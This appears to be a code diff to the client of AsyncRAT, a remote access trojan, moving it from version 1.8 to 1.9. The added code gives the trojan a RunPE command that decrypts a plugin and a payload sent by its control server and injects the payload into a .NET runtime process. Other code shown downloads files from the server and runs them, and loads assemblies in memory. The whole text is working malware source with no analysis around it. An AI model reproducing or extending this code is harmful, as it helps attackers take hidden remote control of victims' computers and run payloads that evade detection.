@@ -63,7 +63,7 @@ Namespace AsyncRAT
         Public Shared ReadOnly Ports As New Collections.Generic.List(Of Integer)({6603, 6604, 6605, 6606})
         Public Shared ReadOnly KEY As String = "<AsyncRAT123>"
 #End If
-        Public Shared ReadOnly VER As String = "AsyncRAT v1.8"
+        Public Shared ReadOnly VER As String = "AsyncRAT v1.9"
     End Class
 
 
@@ -336,6 +336,12 @@ Namespace AsyncRAT
                         Debug.WriteLine("Server just pinged me")
                         Exit Select
 
+                    Case PacketHeader.RunPE
+                        Program.Send(CByte(PacketHeader.MsgReceived))
+                        Dim parameters As Object = New Object() {itm(1), itm(2), itm(3)}
+                        Dim thread As Thread = New Thread(New ParameterizedThreadStart(AddressOf RunPE))
+                        thread.Start(parameters)
+                        Exit Select
                 End Select
 
             Catch ex As Exception
@@ -351,7 +357,7 @@ Namespace AsyncRAT
         Private Shared Sub Download(ByVal Name As String, ByVal Buffer As Byte(), ByRef Update As Boolean)
             Try
                 Dim Temp As String = Path.GetTempFileName + Name
-                File.WriteAllBytes(Temp, AES_Decryptor(Buffer))
+                File.WriteAllBytes(Temp, Buffer)
                 Thread.Sleep(500)
                 Process.Start(Temp)
                 If Update Then
@@ -386,13 +392,25 @@ Namespace AsyncRAT
 
         Private Shared Sub Reflection(ByVal buffer As Byte())
             Try
-                Dim Loader As Assembly = Assembly.Load(buffer)
-
+                Dim Loader As Assembly = Assembly.Load(AES_Decryptor(buffer))
                 If Loader.EntryPoint.GetParameters().Length > 0 Then
                     Loader.EntryPoint.Invoke(Nothing, New Object() {New String() {Nothing}})
                 Else
                     Loader.EntryPoint.Invoke(Nothing, Nothing)
                 End If
+            Catch ex As Exception
+                Program.Send(CByte(PacketHeader.ErrorMassages), ex.Message)
+            End Try
+        End Sub
+
+        Private Shared Sub RunPE(obj As Object())
+            Try
+                Dim Parameters() As Object = DirectCast(obj, Object())
+                Dim pe = DirectCast(Parameters(0), Byte())
+                Dim file = DirectCast(Parameters(1), Byte())
+                Dim target = CType(Parameters(2), String)
+                Dim Loader As Assembly = Assembly.Load(AES_Decryptor(pe))
+                Loader.GetType("Plugin.Program").GetMethod("Run").Invoke(Nothing, New Object() {AES_Decryptor(file), Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), target)})
             Catch ex As Exception
                 Program.Send(CByte(PacketHeader.ErrorMassages), ex.Message)
             End Try
@@ -519,6 +537,7 @@ Namespace AsyncRAT
         Reflection = 7
         MsgReceived = 8
         Ping = 9
+        RunPE = 10
     End Enum
 
 
